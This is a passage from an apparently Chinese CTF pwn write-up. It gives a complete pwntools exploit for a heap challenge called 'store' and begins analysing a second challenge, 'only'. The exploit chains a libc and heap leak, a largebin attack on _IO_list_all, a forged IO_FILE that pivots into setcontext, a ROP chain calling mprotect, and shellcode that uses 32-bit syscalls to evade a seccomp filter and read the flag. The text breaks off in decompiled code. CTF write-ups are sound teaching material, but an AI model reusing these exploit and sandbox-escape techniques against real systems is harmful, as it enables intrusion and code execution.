<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__GI_exit -&gt; __run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_wfile_seekoff</span><br></pre></td></tr></table></figure>
<ul>
<li>直接 <code>exit</code> 就好，不用破坏堆结构</li>
</ul>
<p>在本题目中需要注意两个问题：</p>
<ul>
<li>程序的沙盒禁止了 <code>open</code></li>
<li>“flag”文件的名称未知</li>
</ul>
<p>当不知道程序名称时，我们需要用 <code>getdents</code> 进行操作：</p>
<ul>
<li>先执行 <code>open(&#39;.&#39;,0)</code> 打开当前目录</li>
<li>然后执行 <code>getdents(3, buf, 0x200)</code></li>
</ul>
<p><code>open</code> 和 <code>getdents</code> 都被 ban 了，但是对应32位的 <code>open</code> 和 <code>getdents</code> 没有 ban</p>
<ul>
<li><code>sys_fstat-0x5</code> =&gt; <code>open-0x5</code></li>
<li><code>sys_setpriority-0x8D</code> =&gt; <code>getdents-0x8D</code></li>
</ul>
<p>Shellcode 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0xc0</span></span><br><span class="line"><span class="string">    mov rbx, 0x500000</span></span><br><span class="line"><span class="string">    mov rcx, 0x5000</span></span><br><span class="line"><span class="string">    mov rdx, 3</span></span><br><span class="line"><span class="string">    mov rsi, 1048610</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    xor rbp, rbp</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rsi, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 5</span></span><br><span class="line"><span class="string">    mov rbx, 0x502000</span></span><br><span class="line"><span class="string">    xor rcx, rcx</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 0x8d</span></span><br><span class="line"><span class="string">    mov rbx, 3</span></span><br><span class="line"><span class="string">    mov rcx, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x200</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rsi ,0x502000</span></span><br><span class="line"><span class="string">    mov rdx ,0x200</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>这里先使用32位的 <code>mmap2</code> 申请一片空间</li>
<li>使用 <code>read</code> 读入“.”</li>
<li>然后依次执行32位的 <code>open</code> 和 <code>getdents</code></li>
<li>最后用 <code>write</code> 打印出来</li>
</ul>
<p>找到 “flag” 文件以后，对 shellcode 修改一下就可以了</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.20&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;set debug-file-directory ./debug\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1B0A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">ch</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content,remark</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content:&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Remark:&quot;</span>,<span class="built_in">str</span>(remark))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span>(<span class="params">size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content,remark</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Remark:&quot;</span>,<span class="built_in">str</span>(remark))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>) <span class="comment"># unsortedbin</span></span><br><span class="line">add(<span class="number">0x460</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>,<span class="string">&quot;&quot;</span>) <span class="comment"># largebin</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add2(<span class="number">0x500</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x18</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;b&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0xb50</span> </span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">mprotect = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps= libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;_IO_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">success(<span class="string">&quot;setcontext+61 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(setcontext+<span class="number">61</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000023b6a</span> + libc_base</span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000002601f</span> + libc_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000142c92</span> + libc_base</span><br><span class="line">ret = <span class="number">0x0000000000022679</span> + libc_base</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>  + p64(_IO_list_all-<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload,<span class="string">&quot;b&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add2(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0xc0</span></span><br><span class="line"><span class="string">    mov rbx, 0x500000</span></span><br><span class="line"><span class="string">    mov rcx, 0x5000</span></span><br><span class="line"><span class="string">    mov rdx, 3</span></span><br><span class="line"><span class="string">    mov rsi, 1048610</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    xor rbp, rbp</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rsi, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 5</span></span><br><span class="line"><span class="string">    mov rbx, 0x502000</span></span><br><span class="line"><span class="string">    xor rcx, rcx</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">shellcode = asm(</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0xc0</span></span><br><span class="line"><span class="string">    mov rbx, 0x500000</span></span><br><span class="line"><span class="string">    mov rcx, 0x5000</span></span><br><span class="line"><span class="string">    mov rdx, 3</span></span><br><span class="line"><span class="string">    mov rsi, 1048610</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    xor rbp, rbp</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rsi, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 5</span></span><br><span class="line"><span class="string">    mov rbx, 0x502000</span></span><br><span class="line"><span class="string">    xor rcx, rcx</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 0x8d</span></span><br><span class="line"><span class="string">    mov rbx, 3</span></span><br><span class="line"><span class="string">    mov rcx, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x200</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rsi ,0x502000</span></span><br><span class="line"><span class="string">    mov rdx ,0x200</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;, arch=&#x27;amd64&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x290</span></span><br><span class="line">shellcode_addr = heap_base + <span class="number">0x750</span></span><br><span class="line">payload_addr = heap_base + <span class="number">0x700</span></span><br><span class="line">flag_addr = heap_base+<span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">payload =  p64(payload_addr+<span class="number">0x10</span>) + p64(ret)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(heap_base)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0x7000</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(mprotect) + p64(shellcode_addr)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  p64(<span class="number">0</span>)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(payload_addr-<span class="number">0xa0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(flag_addr)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line">edit(<span class="number">0</span>,fake_IO_FILE,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">choice(<span class="number">5</span>)</span><br><span class="line">p.send(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="only"><a href="#only" class="headerlink" title="only"></a>only</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">only: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">26f</span>d95677098954c2c6ee0e7543a029459dc6f97, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">dele</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !free_num )                            </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk);                                </span><br><span class="line">  --free_num;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>有个 UAF，但是 2.31 版本的 libc 有 tcache key，不能直接利用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">fill</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( fill_key == <span class="number">0xDEADBEEF</span> )                 <span class="comment">// 限制一次</span></span><br><span class="line">  &#123;</span><br><span class="line">    fill_key = <span class="number">0</span>;</span><br><span class="line">    size = <span class="number">0x10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !chunk )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">      size = input_num();</span><br><span class="line">      <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> || size &gt; <span class="number">0xE7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      chunk = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !chunk )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span 